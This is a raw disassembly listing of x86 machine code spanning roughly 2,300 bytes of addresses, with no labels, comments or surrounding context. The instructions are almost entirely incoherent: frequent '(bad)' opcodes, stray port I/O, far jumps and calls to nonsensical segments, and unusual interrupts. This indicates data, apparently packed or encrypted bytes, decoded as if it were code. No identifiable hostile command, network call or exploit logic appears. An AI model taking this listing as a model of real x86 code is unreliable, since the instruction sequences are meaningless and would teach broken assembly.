  4120a6:	add    dl,BYTE PTR [eax-0x35]
  4120a9:	xchg   edx,eax
  4120aa:	jmp    FWORD PTR ss:[ebp+ebp*2+0x5de4412a]
  4120b2:	add    ch,BYTE PTR [eax+0x63]
  4120b5:	sahf   
  4120b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120b7:	mov    ebp,0x413e910b
  4120bc:	arpl   WORD PTR ds:0xfd0f9739,ax
  4120c2:	rcl    dl,1
  4120c4:	stc    
  4120c5:	(bad)  
  4120c6:	aad    0xab
  4120c8:	push   0x2d
  4120ca:	into   
  4120cb:	xchg   esi,eax
  4120cc:	fwait
  4120cd:	ret    0x3f0
  4120d0:	push   cs
  4120d1:	jl     0x41209f
  4120d3:	and    BYTE PTR [eax],0x92
  4120d6:	inc    edx
  4120d7:	add    al,0x0
	...
  4120e5:	add    BYTE PTR [eax],al
  4120e7:	leave  
  4120e8:	shr    DWORD PTR [ebp-0x2b62a4f0],1
  4120ee:	xor    BYTE PTR [edi+ecx*4+0x6f],al
  4120f2:	inc    eax
  4120f3:	aas    
  4120f4:	sbb    al,0xf3
  4120f6:	xchg   esi,eax
  4120f7:	scas   eax,DWORD PTR es:[edi]
  4120f8:	std    
  4120f9:	adc    BYTE PTR [ebx],0x2c
  4120fc:	pop    DWORD PTR [ebp-0xc717fd7]
  412102:	or     ecx,DWORD PTR [ebx]
  412104:	sub    BYTE PTR [esi-0x6a],dh
  412107:	adc    eax,0x9796cd1c
  41210c:	std    
  41210d:	push   eax
  41210e:	aaa    
  41210f:	add    al,0x8f
  412111:	pop    ebp
  412112:	xchg   esi,eax
  412113:	ja     0x4120a6
  412115:	push   ebp
  412116:	adc    BYTE PTR [ebx-0x63],ch
  412119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41211a:	xor    ah,ch
  41211c:	mov    gs,WORD PTR [edi]
  41211e:	shl    DWORD PTR [eax+0x5],0x94
  412122:	mov    cl,al
  412124:	mov    ?,WORD PTR [ebx-0x730234f9]
  41212a:	xchg   esi,eax
  41212b:	int    0xfa
  41212d:	sub    BYTE PTR [edi],cl
  41212f:	jg     0x41214e
  412131:	in     eax,0x40
  412133:	and    al,BYTE PTR ds:0x2ad7abb9
  412139:	push   cs
  41213a:	xchg   esi,eax
  41213b:	sbb    al,0x1d
  41213d:	jmp    0x9090d545
  412142:	out    dx,al
  412143:	daa    
  412144:	inc    esp
  412145:	add    cl,ch
  412147:	push   eax
  412148:	mov    ?,WORD PTR [ecx+eiz*8+0x0]
	...
  412158:	add    BYTE PTR [eax],al
  41215a:	mov    eax,0xeee67c29
  41215f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412160:	nop
  412161:	ss (bad) 
  412163:	(bad)
  412167:	add    eax,0x83bb6255
  41216c:	ret    
  41216d:	lds    edi,FWORD PTR [ecx]
  41216f:	add    eax,0x18f7fc6a
  412174:	or     cl,al
  412176:	mov    dl,0x32
  412178:	jmp    FWORD PTR [esi+0x13fc48d8]
  41217e:	dec    ecx
  41217f:	(bad)  
  412180:	je     0x412173
  412182:	or     BYTE PTR [esi+edi*8-0x6a],bl
  412186:	into   
  412187:	sbb    esp,DWORD PTR [ebx]
  412189:	mov    ds,WORD PTR [ebp+edi*8-0x19]
  41218d:	dec    ecx
  41218e:	into   
  41218f:	mov    ?,esi
  412191:	adc    ebx,DWORD PTR [ebx]
  412193:	(bad)  
  412194:	je     0x412177
  412196:	enter  0xfe77,0x6e
  41219a:	test   BYTE PTR [esi+0x18ee6574],0x8
  4121a1:	push   ecx
  4121a2:	and    al,0x32
  4121a4:	call   DWORD PTR [esi+0x28]
  4121a7:	les    eax,FWORD PTR [ebx]
  4121a9:	jmp    0x6b2c9beb
  4121ae:	and    edx,DWORD PTR [esi+0x1b60d356]
  4121b4:	ds ss fs std 
  4121b8:	out    0xb9,eax
  4121ba:	jl     0x41214a
  4121bc:	(bad)  
  4121bd:	jo     0x4121bf
	...
  4121cb:	add    BYTE PTR [eax],al
  4121cd:	test   BYTE PTR [ecx-0x22df2376],dl
  4121d3:	inc    eax
  4121d4:	jmp    0x9540f0b9
  4121d9:	outs   dx,DWORD PTR ds:[esi]
  4121da:	sbb    eax,0x42f7001f
  4121df:	add    BYTE PTR [edi+0x72],dl
  4121e2:	sub    al,0x28
  4121e4:	add    BYTE PTR [edx-0x5f8b4004],cl
  4121ea:	loopne 0x4121d3
  4121ec:	ficomp WORD PTR [edx]
  4121ee:	js     0x4121ed
  4121f0:	or     ecx,edx
  4121f2:	std    
  4121f3:	pop    ds
  4121f4:	mov    DWORD PTR [edi+0x71],eax
  4121f7:	data16 add BYTE PTR [edx+0x68],bh
  4121fb:	mov    esp,0x40ce5268
  412200:	add    BYTE PTR ds:0x97fff7fc,bl
  412206:	stc    
  412207:	out    0xc8,eax
  412209:	xchg   ecx,eax
  41220a:	jb     0x412209
  41220c:	jmp    DWORD PTR [edi+0x69]
  41220f:	out    0xf1,al
  412211:	je     0x412285
  412213:	std    
  412214:	cld    
  412215:	sbb    ecx,ecx
  412217:	mov    bh,0xff
  412219:	fnsave [ecx-0x3]
  41221c:	repnz mov WORD PTR [eax+0x71a37505],?
  412223:	jae    0x412221
  412225:	(bad)  
  412226:	sti    
  412227:	pop    es
  412228:	call   0x3ff7a1
  41222d:	sbb    eax,0x4c0c0
	...
  41223e:	add    BYTE PTR [eax],al
  412240:	or     bl,ah
  412242:	mov    ch,ah
  412244:	mov    DWORD PTR [edx+eiz*8+0x57],ecx
  412248:	and    BYTE PTR [ecx],cl
  41224a:	push   0x3f
  41224c:	popf   
  41224d:	sti    
  41224e:	pop    es
  41224f:	call   0x3ff776
  412254:	inc    ebx
  412255:	retf   
  412256:	sti    
  412257:	mov    edi,DWORD PTR [edi-0x45bed7b8]
  41225d:	mov    BYTE PTR ds:0x67c9d600,bh
  412263:	sub    eax,0x415963
  412268:	adc    al,0x6
  41226a:	inc    eax
  41226b:	sub    DWORD PTR [ebx-0x62],esp
  41226e:	pop    es
  41226f:	rcl    BYTE PTR [edi],0xb8
  412272:	sub    ebp,eax
  412274:	std    
  412275:	jge    0x41220a
  412277:	(bad)  
  412278:	pop    eax
  412279:	fimul  WORD PTR [esi]
  41227b:	and    dl,bl
  41227d:	(bad)  [ebx-0x5e619c99]
  412283:	mov    ebp,0x4148ec0b
  412288:	arpl   WORD PTR [ebx-0x369b07e8],di
  41228e:	sti    
  41228f:	out    0xb3,eax
  412291:	inc    edi
  412292:	xchg   ebx,eax
  412293:	(bad)  
  412294:	push   esp
  412295:	leave  
  412296:	mov    esp,edi
  412298:	retf   0x92f4
  41229b:	inc    BYTE PTR [edi-0x51]
  41229e:	ret    0x3cb8
  4122a1:	imul   edx,DWORD PTR [edx+0xfe],0x0
	...
  4122b0:	add    BYTE PTR [eax],al
  4122b2:	add    BYTE PTR [ecx],dh
  4122b4:	inc    esp
  4122b5:	int3   
  4122b6:	push   es
  4122b7:	mov    dh,0x35
  4122b9:	sbb    al,0x0
  4122bb:	arpl   WORD PTR [ebx+0x51],si
  4122be:	addr16 push ebp
  4122c0:	loope  0x412306
  4122c2:	add    BYTE PTR [ebx+0x63414923],cl
  4122c8:	sbb    ebx,DWORD PTR [ecx]
  4122ca:	or     bl,bh
  4122cc:	mov    bl,0xd
  4122ce:	(bad)  
  4122cf:	cld    
  4122d0:	mov    bh,0x2
  4122d2:	push   0x435934
  4122d7:	jnp    0x4122a1
  4122d9:	inc    edi
  4122da:	inc    ecx
  4122db:	arpl   WORD PTR [ebx-0x27],ax
  4122de:	mov    bl,BYTE PTR es:[ebp+0x2]
  4122e2:	call   0xfed29815
  4122e7:	fisub  DWORD PTR [eax-0x62]
  4122ea:	imul   esp,DWORD PTR [ebx+0x5],0x46263f91
  4122f1:	jmp    0xa8836c11
  4122f6:	add    ebp,DWORD PTR [ecx+edx*8+0x523dcc5]
  4122fd:	adc    edi,ecx
  4122ff:	cmp    ecx,DWORD PTR [ebp+edi*8-0x7d6ee084]
  412306:	add    edi,ebx
  412308:	sub    al,0xa4
  41230a:	inc    esp
  41230b:	arpl   WORD PTR ds:0x5224953,bx
  412311:	(bad)  
  412313:	cmp    eax,0x427de
	...
  412324:	add    BYTE PTR [eax],al
  412326:	jnp    0x41230d
  412328:	das    
  412329:	xchg   ebx,eax
  41232a:	gs jge 0x412358
  41232d:	xchg   esp,eax
  41232e:	out    dx,eax
  41232f:	inc    eax
  412330:	lds    esi,FWORD PTR [ebx]
  412332:	retf   
  412333:	and    al,0x2c
  412335:	inc    ebp
  412336:	arpl   WORD PTR ds:0x5a24943,bx
  41233c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41233d:	fadd   DWORD PTR [ebp+0x4b0427dc]
  412343:	add    DWORD PTR [eax],esi
  412345:	xchg   ebx,eax
  412346:	sub    eax,0xe19c237d
  41234b:	or     BYTE PTR [ebp+0x3],bh
  41234e:	xchg   edi,eax
  41234f:	cmp    eax,0x613106a
  412354:	std    
  412355:	inc    ebp
  412356:	loopne 0x412360
  412358:	jge    0x41235d
  41235a:	(bad)
  41235e:	arpl   WORD PTR [edx-0x2906d62],bx
  412364:	inc    eax
  412365:	aaa    
  412366:	xchg   ecx,eax
  412367:	mov    cl,BYTE PTR [ebp-0x6e]
  41236a:	outs   dx,DWORD PTR ds:[esi]
  41236b:	xchg   ecx,eax
  41236c:	inc    ebp
  41236d:	sbb    BYTE PTR [ebx-0x63],ch
  412370:	xchg   ecx,eax
  412371:	xor    eax,0x35ff8ad4
  412376:	imul   edx,DWORD PTR [ebp-0x5d374b02],0xffffff9f
  41237d:	mov    ebx,0x94fe8bd1
  412382:	aam    0x8b
  412384:	je     0x412367
  412386:	enter  0x5171,0xe
	...
  412396:	add    BYTE PTR [eax],al
  412398:	add    cl,dl
  41239a:	mov    esi,DWORD PTR [ebp+ecx*1-0xf]
  41239e:	adc    eax,ebp
  4123a0:	(bad)  
  4123a1:	ins    BYTE PTR es:[edi],dx
  4123a2:	std    
  4123a3:	out    0x92,eax
  4123a5:	push   esi
  4123a6:	mov    bh,dh
  4123a8:	out    dx,al
  4123a9:	ins    BYTE PTR es:[edi],dx
  4123aa:	cdq    
  4123ab:	out    0x7d,eax
  4123ad:	xor    al,0x8a
  4123af:	(bad)  
  4123b0:	fimul  WORD PTR [ecx+edx*4-0x19]
  4123b4:	gs xor al,0x8a
  4123b7:	dec    dh
  4123b9:	dec    esp
  4123ba:	xchg   ebp,eax
  4123bb:	out    0x6d,eax
  4123bd:	xchg   esp,eax
  4123be:	mov    bh,dh
  4123c0:	mov    esi,0x35e79d6c
  4123c5:	xchg   esp,eax
  4123c6:	mov    bh,dh
  4123c8:	scas   al,BYTE PTR es:[edi]
  4123c9:	ins    BYTE PTR es:[edi],dx
  4123ca:	mov    esi,edi
  4123cc:	sbb    al,0x3f
  4123ce:	mov    ds:0x8ad23bee,al
  4123d3:	pop    esi
  4123d4:	mov    al,ds:0x34000625
  4123d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123da:	sahf   
  4123db:	sub    BYTE PTR [ebp+0x13001bf3],0x9f
  4123e2:	mov    dh,BYTE PTR [ecx+eiz*8-0x18]
  4123e6:	jae    0x412439
  4123e8:	outs   dx,BYTE PTR ds:[esi]
  4123e9:	bnd jl 0x412430
  4123ec:	gs pop ebp
  4123ee:	add    eax,0x6b58e96a
  4123f3:	inc    esp
  4123f4:	test   al,0x60
  4123f6:	sbb    eax,0x8560e900
  4123fb:	out    0x0,eax
	...
  412409:	add    BYTE PTR [eax],al
  41240b:	add    BYTE PTR [esi],al
  41240d:	fdivp  st(6),st
  41240f:	call   ecx
  412411:	lds    esi,FWORD PTR [edx+0x23]
  412414:	jmp    0x974:0x755f016d
  41241b:	rcr    dh,0x9e
  41241e:	dec    esi
  41241f:	push   0xbeef05ca
  412424:	loop   0x412444
  412426:	inc    esp
  412427:	inc    ecx
  412428:	mov    edx,0x9275fed5
  41242d:	ins    DWORD PTR es:[edi],dx
  41242e:	out    dx,eax
  41242f:	jns    0x4123c6
  412431:	je     0x412419
  412433:	sbb    eax,0xfffd74ef
  412438:	(bad)  
  41243a:	std    
  41243b:	jne    0x4124af
  41243d:	ins    DWORD PTR es:[edi],dx
  41243e:	mov    ss,WORD PTR [edx-0x6b]
  412441:	je     0x41240a
  412443:	ret    0x57e
  412446:	push   ebp
  412447:	mov    esp,DWORD PTR [esi+0x7dfcc280]
  41244d:	out    0xff,eax
  41244f:	imul   ecx,DWORD PTR [ebx+0x22087376],0xf5ff50b2
  412459:	or     eax,DWORD PTR [esp+edi*8-0x4f]
  41245d:	mov    bh,0x3e
  41245f:	sub    BYTE PTR [ebx+0x3a3f8001],cl
  412465:	icebp  
  412466:	aas    
  412467:	push   0x413f96
  41246c:	jge    0x4124d7
  41246e:	jl     0x412497
	...
  41247c:	add    BYTE PTR [eax],al
  41247e:	add    BYTE PTR [edx],cl
  412480:	add    eax,0xa20ec00b
  412485:	push   ebp
  412486:	call   0x3ffb26
  41248b:	icebp  
  41248c:	les    esi,FWORD PTR [edx+0x19]
  41248f:	mov    edx,0x63ffffec
  412494:	aas    
  412495:	push   ecx
  412496:	and    DWORD PTR [bp+si+0x41],esp
  41249a:	add    BYTE PTR [ebx],dh
  41249c:	aas    
  41249d:	push   ss
  41249e:	or     bl,cl
  4124a0:	pop    ss
  4124a1:	or     bh,bh
  4124a3:	int3   
  4124a4:	inc    esi
  4124a5:	dec    esp
  4124a6:	push   ebx
  4124a7:	(bad)  
  4124a8:	xlat   BYTE PTR ds:[ebx]
  4124a9:	mov    ?,WORD PTR [edx]
  4124ab:	mov    ds:0xb4fe9025,eax
  4124b0:	out    0x94,eax
  4124b2:	lods   eax,DWORD PTR ds:[esi]
  4124b3:	imul   edx,DWORD PTR [edi+0x71a4c015],0xffffff8e
  4124ba:	(bad)  
  4124bb:	push   ss
  4124bc:	xchg   esi,eax
  4124bd:	call   0x9a5e:0x8e87311f
  4124c4:	fadd   QWORD PTR [esi]
  4124c6:	add    BYTE PTR [esi],ch
  4124c8:	and    ebx,DWORD PTR [edi+0x36a2a782]
  4124ce:	push   0x63
  4124d0:	xor    al,0x42
  4124d2:	push   esi
  4124d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124d5:	call   0xa688:0x8eb712c1
  4124dc:	ret    0x3c7a
  4124df:	mov    ds:0x44f6,eax
	...
  4124f0:	add    BYTE PTR [eax],al
  4124f2:	jecxz  0x412482
  4124f4:	add    dh,BYTE PTR [ebx+eiz*4+0x46]
  4124f8:	mov    dl,0x44
  4124fa:	mov    ds:0x66e8359e,al
  4124ff:	mov    edi,0x5e580002
  412504:	pop    ss
  412505:	and    ecx,DWORD PTR [esi+eax*4+0x7f1c5dd3]
  41250c:	cli    
  41250d:	mov    edi,0x6832a58f
  412512:	arpl   WORD PTR [esi+0x757bbd9d],bx
  412518:	dec    eax
  412519:	inc    ecx
  41251a:	arpl   WORD PTR ds:0xfd6f8eb9,ax
  412520:	push   eax
  412521:	out    dx,al
  412522:	imul   ecx,DWORD PTR [eax+0x319a9c55],0x4e
  412529:	(bad)  
  41252a:	fcom   st(3)
  41252c:	sub    BYTE PTR [ebp-0x2b],cl
  41252f:	xchg   DWORD PTR ds:0xf056d28f,edi
  412535:	push   es
  412536:	dec    esi
  412537:	(bad)
  41253a:	les    eax,FWORD PTR [eax-0x44a7140]
  412540:	sub    BYTE PTR [eax],bl
  412542:	xchg   DWORD PTR ds:0x522490a,ebx
  412548:	mov    ecx,0x62d7b9b
  41254d:	(bad)  
  41254e:	and    al,0x1d
  412550:	jmp    0x8087a158
  412555:	lods   al,BYTE PTR ds:[esi]
	...
  412562:	add    BYTE PTR [eax],al
  412564:	add    BYTE PTR [edi],bl
  412566:	inc    esi
  412567:	jmp    0xf152a19f
  41256c:	fwait
  41256d:	or     DWORD PTR [esi+ebx*8],0xffffff8e
  412571:	test   cl,bh
  412573:	cmp    al,0x8f
  412575:	sbb    cl,BYTE PTR gs:[edx]
  412578:	pushf  
  412579:	mov    bh,0x2d
  41257b:	(bad)  
  41257c:	mov    gs,WORD PTR [ecx-0x3b]
  41257f:	xor    al,0xe8
  412581:	les    ebx,FWORD PTR [edx+0x3563452b]
  412587:	rcr    DWORD PTR [ecx+0x33a58695],0xcb
  41258e:	add    eax,0x1dee9ee9
  412593:	mov    al,0x48
  412595:	mov    ds:0x978f3905,al
  41259a:	std    
  41259b:	nop
  41259c:	push   ecx
  41259d:	mov    WORD PTR [esi+0x332e9b7d],es
  4125a3:	add    BYTE PTR [esi-0x2b],dh
  4125a6:	xchg   DWORD PTR [ebp+ebp*2-0x13],esi
  4125aa:	adc    DWORD PTR [eax],ecx
  4125ac:	push   ecx
  4125ad:	das    
  4125ae:	xor    al,0xff
  4125b0:	pop    esi
  4125b1:	cmp    eax,0x60edc1bc
  4125b6:	xor    BYTE PTR [ebx-0x103d1ec3],cl
  4125bc:	je     0x4125e9
  4125be:	xchg   ebp,eax
  4125bf:	dec    edi
  4125c0:	ds imul edi,ecx,0xffffffe7
  4125c4:	sahf   
  4125c5:	ja     0x41254d
  4125c7:	(bad)  
  4125c8:	loop   0x4125ca
	...
  4125d6:	add    BYTE PTR [eax],al
  4125d8:	mov    al,ds:0x536a3212
  4125dd:	mov    DWORD PTR [ecx],eax
  4125df:	xchg   edi,eax
  4125e0:	sar    DWORD PTR [ebx+0x44],0x11
  4125e4:	jle    0x41256a
  4125e6:	aaa    
  4125e7:	mov    ebp,0x6191182
  4125ec:	jnp    0x4125e3
  4125ee:	(bad)  
  4125ef:	je     0x412579
  4125f1:	sahf   
  4125f2:	and    eax,0xfe87d599
  4125f7:	je     0x4125e5
  4125f9:	xchg   DWORD PTR [ecx+eiz*8-0x1a],esi
  4125fd:	adc    DWORD PTR [eax],ecx
  4125ff:	shr    DWORD PTR ds:0xe4d6ff35,1
  412605:	inc    eax
  412606:	lock cmp edi,edi
  412609:	push   eax
  41260a:	pop    eax
  41260b:	(bad)  
  41260c:	out    0xbc,al
  41260e:	shr    ebp,0x60
  412611:	xor    BYTE PTR [ebx-0x83e1d3b],cl
  412617:	inc    ebx
  412618:	sbb    eax,DWORD PTR [bp+di-0x5a]
  41261c:	dec    esp
  41261d:	std    
  41261e:	out    0x51,eax
  412620:	ja     0x4125a8
  412622:	(bad)  
  412623:	pusha  
  412624:	pushf  
  412625:	mov    DWORD PTR [ecx-0x17],ebp
  412628:	jp     0x41262f
  41262a:	push   0x413de300
  41262f:	add    BYTE PTR [edx+0x3],dh
  412632:	add    BYTE PTR [eax],al
  412634:	jp     0x41269f
  412636:	jo     0x41268e
  412638:	lea    edi,[eax+0x9]
  41263b:	rol    BYTE PTR [eax],0x0
	...
  41264a:	add    BYTE PTR [esi],dl
  41264c:	mov    ecx,0xe9824587
  412651:	inc    esp
  412652:	inc    esi
  412653:	mov    ebx,0x3275ff01
  412658:	imul   esp,eax,0xb01ca25
  41265e:	rcl    BYTE PTR [esi],0xa5
  412661:	std    
  412662:	jne    0x4125f6
  412664:	imul   eax,DWORD PTR [ecx],0x4e788d5d
  41266a:	push   0x3ebd68
  41266f:	rol    BYTE PTR [ecx],cl
  412671:	add    bh,ch
  412673:	or     al,0xeb
  412675:	dec    DWORD PTR [edi+0x6d]
  412678:	out    dx,al
  412679:	pop    es
  41267a:	call   0x401651
  41267f:	jb     0x412619
  412681:	push   ecx
  412682:	dec    DWORD PTR [ebp+0x62f87378]
  412688:	nop
  412689:	push   ecx
  41268a:	(bad)  
  41268b:	jge    0x412705
  41268d:	jae    0x41268b
  41268f:	(bad)  
  412690:	out    dx,al
  412691:	pop    es
  412692:	call   0x3ff897
  412697:	add    eax,DWORD PTR [edi+0x2]
  41269a:	add    BYTE PTR [edi-0x2],dh
  41269d:	jmp    0xa000:0x68950683
  4126a4:	int    0xfe
  4126a6:	jne    0x4126ea
  4126a8:	mov    eax,ds:0x91fd502c
  4126ad:	xchg   DWORD PTR [ebp+0x0],eax
	...
  4126bc:	add    BYTE PTR [eax],al
  4126be:	into   
  4126bf:	and    BYTE PTR [eax],al
  4126c1:	add    BYTE PTR [ebx-0x75],ah
  4126c4:	dec    esp
  4126c5:	addr16 mov ebx,0x8b00432c
  4126cb:	cmp    DWORD PTR [esi+0x41],eax
  4126ce:	arpl   WORD PTR [ebx],ax
  4126d0:	push   ss
  4126d1:	or     bl,bh
  4126d3:	add    al,0x14
  4126d5:	(bad)  
  4126d6:	cld    
  4126d7:	repz adc eax,0xfa61f4fc
  4126dd:	out    0x9c,eax
  4126df:	mov    esi,0x311afe8b
  4126e4:	pop    es
  4126e5:	add    BYTE PTR [esi],dh
  4126e7:	out    0x9e,eax
  4126e9:	sbb    BYTE PTR [edi+0x63001ac6],0xd3
  4126f0:	dec    esp
  4126f1:	dec    BYTE PTR [esi+0x66]
  4126f4:	call   0x2efe:0x8c332c42
  4126fb:	jp     0x412688
  4126fd:	je     0x41275a
  4126ff:	push   ss
  412700:	imul   ecx,DWORD PTR [esi-0x5c],0x73748c1b
  412707:	adc    edx,DWORD PTR [esi]
  412709:	or     BYTE PTR [ebx-0x7300c405],cl
  41270f:	adc    DWORD PTR [eax+ebx*1],0xffffff84
  412713:	add    edi,esi
  412715:	(bad)  
  412716:	mul    BYTE PTR [ebp-0x66]
  412719:	push   esp
  41271a:	and    al,0x6b
  41271c:	mov    ah,BYTE PTR [edi-0x2c]
  41271f:	sub    al,0x45
	...
  412731:	fs loope 0x412727
  412734:	out    0x86,eax
  412736:	or     DWORD PTR [eax+eax*1],eax
  412739:	push   0xbb6510ae
  41273e:	in     eax,0x41
  412740:	inc    ecx
  412741:	arpl   WORD PTR [esi+0xa],ax
  412744:	and    esp,DWORD PTR [ebx+0x6e]
  412747:	jnp    0x41278d
  412749:	cmp    eax,DWORD PTR ds:0xc6a66d11
  41274f:	call   0x8156d6de
  412754:	add    eax,DWORD PTR [esi+0x5]
  412757:	jmp    0xef39fc5a
  41275c:	push   es
  41275d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41275e:	jge    0x4127cf
  412760:	inc    ecx
  412761:	jae    0x4126e7
  412763:	sti    
  412764:	repz add al,0xa2
  412767:	add    DWORD PTR [ebx-0x749f780b],ecx
  41276d:	jo     0x4127a8
  41276f:	jo     0x4127b2
  412771:	out    0xec,eax
  412773:	out    0x3,eax
  412775:	int3   
  412776:	ret    0x114d
  412779:	imul   ebp,DWORD PTR [ebp+0x33],0x3a
  41277d:	int3   
  41277e:	cmp    DWORD PTR ds:0xbb845711,0xfffffffb
  412785:	les    ebp,FWORD PTR [eax]
  412787:	sahf   
  412788:	mov    dh,BYTE PTR [ebp-0x5278647d]
  41278e:	stc    
  41278f:	lock fwait
  412791:	in     eax,dx
  412792:	rcl    BYTE PTR ds:0x8b,cl
	...
  4127a4:	popf   
  4127a5:	stc    
  4127a6:	lock mov cl,BYTE PTR [edi]
  4127a9:	sbb    DWORD PTR [esi],eax
  4127ab:	adc    DWORD PTR [ebx+0x6d],ebx
  4127ae:	sbb    eax,0x1f83843a
  4127b3:	(bad)  
  4127b4:	push   eax
  4127b5:	add    eax,0x87887e94
  4127ba:	lods   al,BYTE PTR ds:[esi]
  4127bb:	mov    edx,DWORD PTR [esi]
  4127bd:	mov    BYTE PTR [ebx],bl
  4127bf:	ins    DWORD PTR es:[edi],dx
  4127c0:	ss (bad) 
  4127c2:	call   0x6a42feca
  4127c7:	enter  0x33ef,0x28
  4127cb:	add    al,0x63
  4127cd:	stc    
  4127ce:	cmp    DWORD PTR [edi+0xc87],eax
  4127d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d5:	add    eax,0x4a553500
  4127da:	inc    esp
  4127db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127dc:	pusha  
  4127dd:	add    eax,0xca21e900
  4127e2:	imul   ecx
  4127e4:	pusha  
  4127e5:	add    eax,0x81a35c00
  4127ea:	dec    edi
  4127eb:	je     0x412790
  4127ed:	jge    0x41283e
  4127ef:	adc    ebx,DWORD PTR [edi-0x13]
  4127f2:	popa   
  4127f3:	das    
  4127f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f5:	add    eax,0x3073d4ff
  4127fa:	inc    ecx
  4127fb:	jmp    0xaab4eaed
  412800:	fld    QWORD PTR [ecx]
  412802:	clc    
  412803:	jmp    0xccc46874
	...
  412814:	add    BYTE PTR [eax],al
  412816:	add    ah,bl
  412818:	xor    BYTE PTR [edx-0x2],0x4d
  41281c:	stc    
  41281d:	sti    
  41281e:	push   edx
  41281f:	mov    edx,0xe9ff8ad8
  412824:	clc    
  412825:	pop    ss
  412826:	cs push edx
  412828:	and    edi,edi
  41282a:	lahf   
  41282b:	test   al,0x83
  41282d:	jne    0x412808
  41282f:	fyl2xp1 
  412831:	pop    es
  412832:	add    edx,ecx
  412834:	cmp    dh,0xe
  412837:	dec    edx
  412838:	or     BYTE PTR [ecx+eax*1-0x1b],0x48
  41283d:	add    ebp,DWORD PTR [edx+0x5b]
  412840:	jge    0x412841
  412842:	jl     0x4128a7
  412844:	xchg   BYTE PTR ds:0xfe5a53e9,bh
  41284a:	pop    esp
  41284b:	fild   DWORD PTR [ebx-0x3a767fec]
  412851:	push   DWORD PTR [esi]
  412853:	sbb    BYTE PTR [ebx+eax*1-0x17],al
  412857:	test   DWORD PTR [esi+0x45b900eb],ecx
  41285d:	repnz push ebx
  41285f:	std    
  412860:	inc    ecx
  412861:	clc    
  412862:	add    BYTE PTR [edx+0x6],cl
  412865:	add    bh,al
  412867:	jg     0x4127fe
  412869:	(bad)  
  41286a:	(bad)  
  41286b:	cmp    al,BYTE PTR [esi]
  41286d:	push   DWORD PTR [ebp+0x2a]
  412870:	std    
  412871:	inc    ebx
  412872:	cld    
  412873:	fistp  DWORD PTR [ecx]
  412875:	cld    
  412876:	push   0xa
  412878:	and    BYTE PTR [eax],al
  41287a:	push   0x0
	...
  412888:	add    BYTE PTR [eax],al
  41288a:	cli    
  41288b:	pop    ds
  41288c:	add    bh,bh
  41288e:	jp     0x20479e91
  412894:	add    BYTE PTR [edx+0xa],ch
  412897:	sahf   
  412898:	retf   0xfa22
  41289b:	add    eax,0x530ec00b
  4128a0:	dec    esi
  4128a1:	push   eax
  4128a2:	and    ch,BYTE PTR [ebx]
  4128a4:	push   ecx
  4128a5:	jmp    DWORD PTR ds:0x3f843fe
  4128ab:	and    BYTE PTR [eax],al
  4128ad:	push   0xffffffba
  4128af:	push   DWORD PTR ss:[ebp+0x72]
  4128b3:	mov    WORD PTR [ebx-0x4],?
  4128b6:	test   DWORD PTR [edx],edx
  4128b8:	or     al,0x6a
  4128ba:	mov    edx,0x1ce8001f
  4128bf:	imul   edi,esi,0xffffffff
  4128c2:	add    DWORD PTR [ebp+0x73],0xf812650f
  4128c9:	call   0x405f6c
  4128ce:	cmp    eax,0x8a00f842
  4128d3:	add    eax,0x8e078300
  4128d8:	(bad)  
  4128d9:	jae    0x41290f
  4128db:	mov    WORD PTR [ebx+0x8],?
  4128de:	test   DWORD PTR [edx],edx
  4128e0:	clc    
  4128e1:	call   0x24af49
  4128e6:	push   esp
  4128e7:	fs ret 0x8c73
  4128eb:	push   ds
  4128ec:	mov    DWORD PTR [eax+eax*1+0x0],esi
	...
  4128fc:	add    BYTE PTR [ebx+0x56],bl
  4128ff:	add    esp,DWORD PTR [edx]
  412901:	arpl   WORD PTR [esi+0x29],bp
  412904:	add    esp,DWORD PTR [edx]
  412906:	in     al,0xaa
  412908:	jmp    0x4aae:0xccaee79
  41290f:	sar    bh,0x1c
  412912:	cmp    al,0x9c
  412914:	in     eax,dx
  412915:	inc    edx
  412916:	outs   dx,BYTE PTR ds:[esi]
  412917:	add    cl,BYTE PTR [ebx]
  412919:	and    eax,DWORD PTR [ebx-0x694cb013]
  41291f:	nop
  412920:	dec    edi
  412921:	cld    
  412922:	idiv   DWORD PTR [ecx+0x44]
  412925:	out    dx,eax
  412926:	adc    eax,0xe276ff33
  41292b:	xor    ebp,eax
  41292d:	inc    esp
  41292e:	mov    ebp,0x70c8fe87
  412933:	inc    edx
  412934:	sbb    BYTE PTR [ebx-0x332ef292],0xc1
  41293b:	mov    ah,bh
  41293d:	mov    ds:0xe8fe879e,al
  412942:	mov    cl,0x8e
  412944:	pop    edx
  412945:	stos   BYTE PTR es:[edi],al
  412946:	sub    al,0xf7
  412948:	call   DWORD PTR [edi]
  41294a:	repz xchg esi,eax
  41294c:	sbb    BYTE PTR [edi-0x1fa8cec6],0x59
  412953:	stc    
  412954:	sub    BYTE PTR [edx],ah
  412956:	outs   dx,BYTE PTR ds:[esi]
  412957:	add    dh,BYTE PTR [ebp+0x65]
  41295a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41295b:	sub    cl,cl
  41295d:	mov    eax,ds:0x8d0272
	...
  41296e:	add    BYTE PTR [eax],al
  412970:	es jle 0x4129a4
  412973:	(bad)  
  412974:	out    dx,al
  412975:	popa   
  412976:	call   0x5987:0xe6051530
  41297d:	inc    ebp
  41297e:	in     eax,dx
  41297f:	jg     0x412910
  412981:	push   es
  412982:	jmp    0xcd430b8a
  412987:	add    al,0x63
  412989:	adc    eax,0x17e1f6e9
  41298e:	call   0x3bc18c96
  412993:	mov    BYTE PTR ds:0xe89cb0fa,dh
  412999:	frstor [ebp-0x12baa679]
  41299f:	and    BYTE PTR [eax+0x6],0xe9
  4129a3:	add    edx,DWORD PTR [edx+edi*8]
  4129a6:	mov    WORD PTR [edi+0xb107d97],es
  4129ac:	popf   
  4129ad:	(bad)  
  4129ae:	call   0x75c03b4e
  4129b3:	xchg   ebx,ebp
  4129b5:	leave  
